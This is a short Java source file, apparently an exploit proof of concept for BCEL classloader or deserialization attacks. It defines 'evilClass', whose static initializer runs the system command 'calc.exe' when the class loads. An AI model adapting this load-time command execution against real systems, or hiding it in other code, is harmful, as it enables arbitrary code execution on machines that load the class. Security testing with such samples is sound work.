package BCEL;

public class evilClass {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /*
    public static void main(String[] args) {
        evilClass evil = new evilClass();
    }
    */
}
